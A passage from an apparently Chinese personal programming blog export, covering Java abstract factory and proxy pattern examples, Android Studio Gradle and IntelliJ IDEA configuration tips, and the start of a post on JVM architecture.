<h2 id="案例代码"><a href="#案例代码" class="headerlink" title="案例代码"></a>案例代码</h2><p><img src="https://i.loli.net/2021/12/02/lbs1DBO4Ec3mZGY.png" alt="image-20211202235702091"></p>
<p>由于代码篇幅较长，所以分成两部分</p>
<p>第一部分：产品部分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//手机接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IpPhoneProduct</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printPhoneName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//路由器接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IpRouterProduct</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printRouterName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//华为手机</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiPhone</span> <span class="keyword">implements</span> <span class="title">IpPhoneProduct</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printPhoneName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;华为手机&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//华为路由器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiRouter</span> <span class="keyword">implements</span> <span class="title">IpRouterProduct</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printRouterName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;华为路由器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//小米手机</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaomiPhone</span> <span class="keyword">implements</span> <span class="title">IpPhoneProduct</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printPhoneName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小米手机&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//小米路由器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaomiRouter</span> <span class="keyword">implements</span> <span class="title">IpRouterProduct</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printRouterName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;小米路由器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二部分：生产工厂部分</p>
<p><strong>和工厂方法模式进行对比</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//抽象产品工厂接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IpProductFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">//生产手机</span></span><br><span class="line">    <span class="function">IpPhoneProduct <span class="title">getipPhoneProduct</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//生产路由器</span></span><br><span class="line">    <span class="function">IpRouterProduct <span class="title">getipRouterProduct</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//华为产品生产商（实现抽象产品工厂接口）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HuaweiProductFactory</span> <span class="keyword">implements</span> <span class="title">IpProductFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IpPhoneProduct <span class="title">getipPhoneProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HuaweiPhone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IpRouterProduct <span class="title">getipRouterProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HuaweiRouter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//小米产品生产商（实现抽象产品工厂接口）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaomiProductFactory</span> <span class="keyword">implements</span> <span class="title">IpProductFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IpPhoneProduct <span class="title">getipPhoneProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> XiaomiPhone();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IpRouterProduct <span class="title">getipRouterProduct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> XiaomiRouter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类（消费者、调用者）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//华为</span></span><br><span class="line">        <span class="comment">//华为生产商生产华为手机</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> HuaweiProductFactory().getipPhoneProduct());</span><br><span class="line">        <span class="comment">//华为生产商生产华为路由器</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> HuaweiProductFactory().getipRouterProduct());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//小米</span></span><br><span class="line">        <span class="comment">//小米生产商生产小米手机</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> XiaomiProductFactory().getipPhoneProduct());</span><br><span class="line">        <span class="comment">//小米生产商生产小米路由器</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> XiaomiProductFactory().getipRouterProduct());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>对比和可以发现：他俩的区别就在于，一个是针对两个产品族以上的，一个是针对一个产品族的。</strong></p>
]]></content>
      <tags>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>23种设计模式（4）-代理模式</title>
    <url>/2021/08/31/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%884%EF%BC%89-%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><span id="more"></span>

<p>阅读<a href="https://www.runoob.com/design-pattern/proxy-pattern.html">菜鸟教程-代理模式</a>后，得到如下信息：</p>
<p><strong>意图：</strong>为其他对象提供一种代理以控制这个对象的访问</p>
<p><strong>主要解决：</strong>在某些访问对象时带来的问题，比如：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。</p>
<p><strong>何时使用：</strong>想在访问一个类时做一些控制</p>
<p><strong>如何解决：</strong>增加中间层</p>
<p><strong>关键代码：</strong>实现与被代理类<strong>组合</strong></p>
<p><strong>应用实例：</strong></p>
<ul>
<li>windows里面的快捷方式</li>
<li>买火车票不一定要去火车站买，也可以去代售点</li>
<li>一张支票或银行存单是账户中资金的代理</li>
<li><strong>Spring的AOP</strong></li>
</ul>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p><strong>角色分析：</strong></p>
<ul>
<li>抽象角色：一般使用接口或者抽象类来实现</li>
<li>真实角色：被代理的角色</li>
<li>代理角色：代理真实角色；代理真实角色后，一般会做些附属的操作</li>
<li>客户：使用代理角色来进行一些操作</li>
</ul>
<p><img src="https://i.loli.net/2021/11/03/CuOFsflbZXJPadW.png" alt="image-20211103201403438"></p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p><strong>Rent</strong>.java：抽象角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Host</strong>.java：被代理的真实角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Host</span> <span class="keyword">implements</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我要出租房子!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Proxy</strong>：代理角色</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHost</span><span class="params">(Host host)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.host = host;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        host.rent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//后面还可以添加其他的附属操作（方法）（比如一些公共操作，这些操作完全可以交由非被代理类的角色去完成）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Client</strong>：客户（真实角色，也用于测试）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Host host = <span class="keyword">new</span> Host();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//new一个代理类</span></span><br><span class="line">        Proxy proxy = <span class="keyword">new</span> Proxy();</span><br><span class="line">        <span class="comment">//配置好代理类</span></span><br><span class="line">        proxy.setHost(host);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用代理类进行出租</span></span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过代码，可以清晰看到：Host的rent()动作由Proxy代理角色执行了</p>
<h3 id="优、缺点"><a href="#优、缺点" class="headerlink" title="优、缺点"></a>优、缺点</h3><p><strong>优点：</strong></p>
<ul>
<li>可以使得我们的真实角色更加纯粹，不再关注一些公共的事情</li>
<li>公共的业务可以交由代理角色来完成（即在代理类中添加其他的方法）</li>
<li>公共业务发生扩展时，变得更加集中和方便</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>由于一个被代理类，就对应着一个代理类，那么类多了，代理类就多了，工作量变大了，开发效率会降低（因此出现了动态代理）</li>
</ul>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p><img src="https://i.loli.net/2021/11/03/W6kC7Zpc3OMR1LK.png" alt="image-20211103201450376"></p>
<p><strong>区别：动态代理的代理类是动态生成的；</strong>静态代理的代理类是我们写好的</p>
<p><strong>本质：利用反射机制在运行时创建代理类</strong></p>
<p><strong>动态代理主要分为两类：</strong>基于接口的动态代理（JDK动态代理）、基于类的动态代理（cglib）</p>
<h3 id="基于接口的动态代理"><a href="#基于接口的动态代理" class="headerlink" title="基于接口的动态代理"></a>基于接口的动态代理</h3><p><strong>核心：</strong>java的<strong>java.lang.reflect包下</strong>提供了一个Proxy类和一个InvocationHandler接口，通过这个类和这个接口可以生成JDK动态代理类和动态代理对象。（<strong>注意是java.lang.reflect包下的</strong>）</p>
<p><strong>Proxy类：</strong>提供了创建对象的静态方法，这些对象充当接口实例</p>
<ul>
<li><code>Proxy</code> provides static methods for creating objects that act like instances of interfaces but allow for customized method invocation</li>
<li>例如：To create a proxy instance for some interface <code>Foo</code>:</li>
<li>已经提供的静态方法：<br><img src="https://i.loli.net/2021/11/03/Lo9BexDiK5PWmG1.png" alt="image-20211103201120648"></li>
</ul>
<p><strong>InvocationHandler接口：</strong></p>
<ul>
<li>Each proxy instance has an associated invocation handler.</li>
<li>When a method is invoked on a proxy instance, the method invocation is encoded and dispatched to the <code>invoke</code> method of its invocation handler.</li>
<li>唯一的方法<br><img src="https://i.loli.net/2021/11/03/2jB1ysDzhd94PMF.png" alt="image-20211103195109442"></li>
</ul>
<h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><p><strong>步骤：</strong></p>
<ul>
<li>写好接口</li>
<li>写好被代理类</li>
<li><strong>创建代理模式</strong>（<strong>关键步骤：分两步</strong>：）<ul>
<li><strong>第一步：生成代理类对象（Proxy已经提供了相应的静态方法）</strong></li>
<li><strong>第二步：事务处理程序（继承InvocationHandler接口，并重写invoke方法）</strong></li>
<li>注意：上面两步骤可以都写在事务处理器的类中，也可以分开写（本文就全写在一个类中了，这样以后调用的时候比较方便）</li>
</ul>
</li>
</ul>
<p><strong>ProxyInvocationHandler</strong>.java：生成代理类，创建相应的事务处理程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Rent rent;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRent</span><span class="params">(Rent rent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.rent = rent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//①生成代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(), rent.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//②重写事务处理程序的invoke方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        seeHouse();</span><br><span class="line">        <span class="comment">//通过反射机制调用rent对象的method方法，方法的参数为args</span></span><br><span class="line">        Object result = method.invoke(rent, args);</span><br><span class="line">        fare();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//可以自己添加公共方法</span></span><br><span class="line">    <span class="comment">//看房</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">seeHouse</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;带房客看房&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//收中介费</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fare</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;收中介费&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Client</strong>.java：客户（真实角色，也用于测试）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//真实角色</span></span><br><span class="line">        Host host = <span class="keyword">new</span> Host();</span><br><span class="line">        <span class="comment">//代理实例的调用处理程序</span></span><br><span class="line">        ProxyInvocationHandler handler = <span class="keyword">new</span> ProxyInvocationHandler();</span><br><span class="line">        <span class="comment">//将真实角色放置进去！</span></span><br><span class="line">        handler.setRent(host);</span><br><span class="line">        <span class="comment">//获得代理实例</span></span><br><span class="line">        Rent proxy = (Rent) handler.getProxy();     <span class="comment">//这边需要强转一下，否则调用不了Rent的方法</span></span><br><span class="line">        proxy.rent();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/03/XgF9h5t86ezwVAy.png" alt="image-20211103204551976"></p>
<h3 id="分步解释"><a href="#分步解释" class="headerlink" title="分步解释"></a>分步解释</h3><h4 id="①"><a href="#①" class="headerlink" title="①"></a>①</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//①生成代理类</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 三个参数（依次）：</span></span><br><span class="line"><span class="comment">     * loader：类加载器</span></span><br><span class="line"><span class="comment">     * interfaces：代理的接口</span></span><br><span class="line"><span class="comment">     * InvocationHandler：事务处理程序</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(), rent.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="②"><a href="#②" class="headerlink" title="②"></a>②</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//②重写事务处理程序的invoke方法</span></span><br><span class="line"><span class="comment">/* 参数：</span></span><br><span class="line"><span class="comment">     * proxy：调用该方法的代理实例，method：被代理的对象的方法，args：方法的参数</span></span><br><span class="line"><span class="comment">     * 返回：</span></span><br><span class="line"><span class="comment">     * Object方法返回值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    seeHouse();</span><br><span class="line">    <span class="comment">//通过反射机制调用rent对象的method方法，方法的参数为args</span></span><br><span class="line">    Object result = method.invoke(rent, args);</span><br><span class="line">    fare();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>动态代理，代理的是一个接口；</strong></p>
<ul>
<li>所以可以代理所有实现这一接口的类；</li>
</ul>
<p><strong>静态代理，代理的是一个类；</strong></p>
<ul>
<li>所以出现一个类实现了一个接口，如果想要使用代理类，就需要对应写一个代理类</li>
</ul>
]]></content>
      <tags>
        <tag>设计模式</tag>
        <tag>代理模式</tag>
        <tag>Proxy</tag>
        <tag>InvocationHandler</tag>
        <tag>动态代理</tag>
        <tag>静态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>AndroidStudio的Gradle配置</title>
    <url>/2022/02/24/AndroidStudio%E7%9A%84Gradle%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><span id="more"></span>

<p>由于不喜欢使用软件默认的路径配置，所以，我把下载好的gradle文件放到了D盘。</p>
<p>但是，AndroidStudio每次新建project的时候，总是会从网上重新下载Gralde到默认的路径中。（<strong>即使修改了软件中的setting  for  new  projects 也无效</strong>）</p>
<p>而且，这种从网上下载的速度巨慢！！</p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>经上网搜阅，找到解决方法。</p>
<p>首先打开设置，进入到如下位置：</p>
<p><img src="https://s2.loli.net/2022/02/24/GiUMaS5KTDwPdh2.png" alt="image-20220224160959692"></p>
<p>然后，我们找到这个‘gradle-wrapper.properties’文件：</p>
<p><img src="https://s2.loli.net/2022/02/24/kg7vtPBXmMDWw6i.png" alt="image-20220224161110313"></p>
<p>发现，有很多路径配置，而这个就是AndroidStudio寻找Gradle的路径顺序。</p>
<p>所以，只需要配置一个同名的系统环境变量<code>GRADLE_USER_HOME</code>就可以了</p>
<p><img src="https://s2.loli.net/2022/02/24/dkrCeWhEcOYBlK9.png" alt="image-20220224161428593"></p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>再试一下效果，重新创建一个project，发现已经没有下载gradle这一个步骤了</p>
<p>再看一下setting：</p>
<p><img src="https://s2.loli.net/2022/02/24/fl3TaCSMEwb1kJD.png" alt="image-20220224161656241"></p>
]]></content>
      <tags>
        <tag>配置</tag>
      </tags>
  </entry>
  <entry>
    <title>Idea添加pom依赖时，报内存不足</title>
    <url>/2022/02/11/Idea%E6%B7%BB%E5%8A%A0pom%E4%BE%9D%E8%B5%96%E6%97%B6%EF%BC%8C%E6%8A%A5%E5%86%85%E5%AD%98%E4%B8%8D%E8%B6%B3/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><span id="more"></span>

<blockquote>
<p>在pom.xml中添加dependency的时候，弹窗报内存不足，如图：</p>
<p><img src="https://s2.loli.net/2022/02/11/zWtOFPlUAoRsaDr.png" alt="image-20220211144458945"></p>
</blockquote>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p><strong>按照网上的说法，修改对应不足的内存数值就行</strong></p>
<p>（但是这个方法并没有奏效）</p>
<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p><strong>更新IDEA中的maven的本地repository的配置</strong></p>
<p><img src="https://s2.loli.net/2022/02/11/2jEYnHSWOwFb1MT.png" alt="image-20220211144617101"></p>
<p>注意：更新的时候可能会失败，建议更新的时候看到idea下面有进度条的时候，关闭setting页面，然后等待更新完成，重新检查一下是否更新成功。</p>
]]></content>
      <tags>
        <tag>Idea使用</tag>
        <tag>内存不足</tag>
      </tags>
  </entry>
  <entry>
    <title>Idea的项目结构教程</title>
    <url>/2021/11/08/Idea%E7%9A%84%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p><strong>本文主要讲解两个路径问题：①编译路径②打包路径</strong></p>
<h2 id="编译路径"><a href="#编译路径" class="headerlink" title="编译路径"></a>编译路径</h2><span id="more"></span>

<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="图①"><a href="#图①" class="headerlink" title="图①"></a>图①</h4><p><img src="https://i.loli.net/2021/11/08/1HCzikxtAZWIdOL.png" alt="image-20211108153134616"></p>
<h4 id="图②"><a href="#图②" class="headerlink" title="图②"></a>图②</h4><p><img src="https://i.loli.net/2021/11/08/3wKBL9sJTIrYpzc.png" alt="image-20211108153031796"></p>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><h4 id="图③"><a href="#图③" class="headerlink" title="图③"></a>图③</h4><p><img src="https://i.loli.net/2021/11/08/1Ray6fcbW28zJMP.png" alt="image-20211108153409089"></p>
<h2 id="打包路径（例如Web项目）"><a href="#打包路径（例如Web项目）" class="headerlink" title="打包路径（例如Web项目）"></a>打包路径（例如Web项目）</h2><p><strong>主要分为两种类型：①打包成war包发布；②以文件夹形式发布</strong></p>
<p>但是我发现，第①种有时候也会生成文件夹的形式（即选择了第一种，但是两个类型结果都出现了）</p>
<h3 id="配置一（打包成war包的形式）"><a href="#配置一（打包成war包的形式）" class="headerlink" title="配置一（打包成war包的形式）"></a>配置一（打包成war包的形式）</h3><h4 id="图①-①"><a href="#图①-①" class="headerlink" title="图①-①"></a>图①-①</h4><p><img src="https://i.loli.net/2021/11/08/ZCyfXuGbdSqVFtn.png" alt="image-20211108153901729"></p>
<h4 id="图①-②：配置tomcat部署"><a href="#图①-②：配置tomcat部署" class="headerlink" title="图①-②：配置tomcat部署"></a>图①-②：配置tomcat部署</h4><p><img src="https://i.loli.net/2021/11/08/LAn4qYaDPJ1Zew7.png" alt="image-20211108154207401"></p>
<h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><h4 id="图①-③"><a href="#图①-③" class="headerlink" title="图①-③"></a>图①-③</h4><p><img src="https://i.loli.net/2021/11/08/wg5DdqWpeNjPZrt.png" alt="image-20211108154339567"></p>
<h3 id="配置二（以-文件夹-形式发布项目）"><a href="#配置二（以-文件夹-形式发布项目）" class="headerlink" title="配置二（以 文件夹 形式发布项目）"></a>配置二（以 文件夹 形式发布项目）</h3><h4 id="图②-①"><a href="#图②-①" class="headerlink" title="图②-①"></a>图②-①</h4><p><img src="https://i.loli.net/2021/11/08/mvXNL2Fg4jTKzb8.png" alt="image-20211108154924253"></p>
<h4 id="图②-②"><a href="#图②-②" class="headerlink" title="图②-②"></a>图②-②</h4><p><img src="https://i.loli.net/2021/11/08/OSiVbPDKIxmsZhe.png" alt="image-20211108155159897"></p>
<h3 id="效果-2"><a href="#效果-2" class="headerlink" title="效果"></a>效果</h3><h4 id="图②-③"><a href="#图②-③" class="headerlink" title="图②-③"></a>图②-③</h4><p><img src="https://i.loli.net/2021/11/08/gRiIG1xnmU3OJtr.png" alt="image-20211108155353757"></p>
]]></content>
      <tags>
        <tag>Idea使用教程</tag>
        <tag>项目结构</tag>
        <tag>Tomcat</tag>
        <tag>项目打包</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA中UDP和TCP协议的简单使用流程</title>
    <url>/2021/08/31/JAVA%E4%B8%ADUDP%E5%92%8CTCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="JAVA中UDP和TCP协议的简单使用"><a href="#JAVA中UDP和TCP协议的简单使用" class="headerlink" title="JAVA中UDP和TCP协议的简单使用"></a>JAVA中UDP和TCP协议的简单使用</h2><span id="more"></span>

<p><img src="https://i.loli.net/2021/08/31/zVGoNJrIRnCtUDB.png" alt="image-20210831120154422"></p>
<p><img src="https://i.loli.net/2021/08/31/eSj6trpk78V9IaT.png" alt="image-20210831120308018"></p>
<p><img src="https://i.loli.net/2021/08/31/DzV4XUWLlkpCf82.png" alt="image-20210831120224998"></p>
]]></content>
      <tags>
        <tag>TCP</tag>
        <tag>Socket</tag>
        <tag>UDP</tag>
        <tag>DatagramSocket</tag>
        <tag>DatagramPacket</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM的位置和体系结构</title>
    <url>/2021/10/23/JVM%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%92%8C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h2 id="JAV体系结构"><a href="#JAV体系结构" class="headerlink" title="JAV体系结构"></a>JAV体系结构</h2><span id="more"></span>

<p><img src="https://i.loli.net/2021/10/23/q6Imytf9WSnYVl3.png" alt="image-20211023132927213"></p>
<h3 id="上图中名次解释"><a href="#上图中名次解释" class="headerlink" title="上图中名次解释"></a>上图中名次解释</h3><ul>
<li><p><strong>Class File：</strong>java文件通过<code>javac </code>执行类似<code>javac  Hello.java</code> 的命令，将java文件编译成class文件</p>
</li>
<li><p><strong>类加载器：</strong>将一些类加载到内存中的方法区中，</p>
</li>
<li><p><strong>方法区：</strong>在jdk1.8之前叫方法区,1.8之后修改成方法区,不同点在于,方法区属于堆空间一部分,是有默认大小的,元空间利用的是宿主机的内存,是动态扩展的；<strong>主要存放了一些常量、静态变量、类信息等，可以理解成class文件在内存中的存放位置。</strong></p>
</li>
<li><p><strong>栈：</strong>JVM执行java代码使用的栈</p>
